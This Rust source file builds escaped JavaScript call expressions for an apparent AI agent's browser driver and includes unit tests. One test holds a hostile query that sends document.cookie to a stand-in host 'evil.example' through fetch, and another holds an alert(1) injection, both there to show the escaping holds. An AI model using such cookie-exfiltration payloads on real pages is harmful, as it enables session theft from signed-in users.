// SPDX-License-Identifier: Apache-2.0
//! Building the expressions evaluated inside a page.
//!
//! The driver sends JavaScript to the browser as text, and some of that text
//! is chosen by the model — a `find` query, a ref to click. Pasting those into
//! source would let a crafted argument close the string and run whatever it
//! likes in the context of a page the user is *signed in to*. Every argument
//! therefore goes through [`serde_json::to_string`], which emits a valid,
//! fully-escaped JS literal, and the builders below are the only place call
//! expressions are assembled.

use serde::Deserialize;

use super::PageContent;

/// The page-side script, shared verbatim with the future extension backend.
pub const SCRIPT: &str = include_str!("page.js");

/// Namespace the script installs on `window`.
const NS: &str = "window.__codefactory_page";

/// Expression that installs the script (idempotent) and reports its version.
pub fn install_expression() -> String {
    SCRIPT.to_string()
}

/// Expression that returns `true` when the script is already present.
pub fn is_installed_expression() -> String {
    format!("Boolean({NS})")
}

pub fn readable_expression() -> String {
    format!("JSON.stringify({NS}.readable())")
}

pub fn find_expression(query: &str, limit: usize) -> String {
    format!(
        "JSON.stringify({NS}.find({}, {}))",
        js_literal(query),
        limit
    )
}

pub fn snapshot_expression(limit: usize) -> String {
    format!("JSON.stringify({NS}.snapshot({}))", limit)
}

/// Expression that resolves a ref and reports whether it exists — the driver
/// uses it to give "that element is gone, take a fresh snapshot" instead of a
/// silent no-op when the page changed under a stale ref.
pub fn resolve_ref_expression(reference: &str) -> String {
    format!("Boolean({NS}.byRef({}))", js_literal(reference))
}

/// Render a Rust string as a JavaScript literal, escaped.
fn js_literal(value: &str) -> String {
    serde_json::to_string(value).unwrap_or_else(|_| "\"\"".into())
}

#[derive(Debug, Deserialize)]
struct RawPage {
    url: String,
    title: String,
    markdown: String,
    truncated: bool,
}

/// Parse what `readable()` returned.
pub fn parse_readable(json: &str) -> Option<PageContent> {
    let raw: RawPage = serde_json::from_str(json).ok()?;
    Some(PageContent {
        url: raw.url,
        title: raw.title,
        markdown: raw.markdown,
        truncated: raw.truncated,
    })
}

#[derive(Debug, Deserialize)]
struct RawHit {
    #[serde(rename = "ref")]
    reference: String,
    snippet: String,
}

/// Parse what `find()` returned into `ref — snippet` lines.
pub fn parse_find(json: &str) -> Vec<String> {
    serde_json::from_str::<Vec<RawHit>>(json)
        .map(|hits| {
            hits.into_iter()
                .map(|hit| format!("{} — {}", hit.reference, hit.snippet))
                .collect()
        })
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Pull the argument back out of a built expression and decode it.
    ///
    /// Reads the first JSON value after the call opener and stops there, so it
    /// works the same for a one-argument call and a two-argument one without
    /// hand-parsing parentheses.
    fn argument_of(expression: &str, call: &str) -> String {
        let after = expression.split_once(call).expect("call present").1;
        serde_json::Deserializer::from_str(after)
            .into_iter::<String>()
            .next()
            .expect("an argument follows the call opener")
            .expect("argument is a single valid JS string literal")
    }

    #[test]
    fn a_query_cannot_break_out_of_its_string() {
        // The attack this guards: a model-chosen query closing the literal and
        // appending code that runs on a page the user is signed in to. The
        // property is not "the text disappears" — it is that the text stays
        // *inside one string literal*, so it is data the page never executes.
        let hostile = "\"); fetch('https://evil.example?c='+document.cookie); (\"";
        let expression = find_expression(hostile, 10);

        assert_eq!(argument_of(&expression, ".find("), hostile);
        assert_eq!(expression.matches(".find(").count(), 1, "exactly one call");
        assert!(expression.starts_with("JSON.stringify(window.__codefactory_page.find("));
    }

    #[test]
    fn quotes_newlines_and_unicode_survive_as_data() {
        for value in ["say \"hi\"", "line\nbreak", "反斜杠\\结尾", "emoji 🎯", "</script>"] {
            let expression = find_expression(value, 5);
            assert_eq!(argument_of(&expression, ".find("), value);
        }
    }

    #[test]
    fn refs_are_escaped_too() {
        // A ref carrying selector metacharacters must come back as itself, not
        // as something that widens what byRef matches.
        let hostile = "ref_1'] ; alert(1); //";
        let expression = resolve_ref_expression(hostile);
        assert_eq!(argument_of(&expression, ".byRef("), hostile);
        assert_eq!(expression.matches(".byRef(").count(), 1);
    }

    #[test]
    fn readable_output_maps_onto_page_content() {
        let json = r##"{"url":"https://example.com/a","title":"A","markdown":"# A\n\nbody","truncated":true}"##;
        let page = parse_readable(json).expect("parsed");
        assert_eq!(page.url, "https://example.com/a");
        assert_eq!(page.title, "A");
        assert!(page.markdown.contains("# A"));
        assert!(page.truncated);
    }

    #[test]
    fn malformed_page_output_is_not_silently_turned_into_an_empty_page() {
        // A driver that reported an empty article for a failed extraction would
        // be worse than an error — the agent would summarise "nothing here".
        assert!(parse_readable("not json").is_none());
        assert!(parse_readable("{\"url\":\"u\"}").is_none());
    }

    #[test]
    fn find_output_becomes_ref_and_snippet_lines() {
        let json = r#"[{"ref":"ref_3","snippet":"…the quarterly report…"}]"#;
        assert_eq!(
            parse_find(json),
            vec!["ref_3 — …the quarterly report…".to_string()]
        );
        assert!(parse_find("nope").is_empty());
    }

    #[test]
    fn the_shared_page_script_is_embedded_and_self_installing() {
        // The extension backend loads this same file as a content script, so it
        // must stay a standalone expression with no imports.
        assert!(SCRIPT.contains("__codefactory_page"));
        assert!(!SCRIPT.contains("import "));
        assert!(!SCRIPT.contains("require("));
        assert!(install_expression().contains("readable"));
    }
}
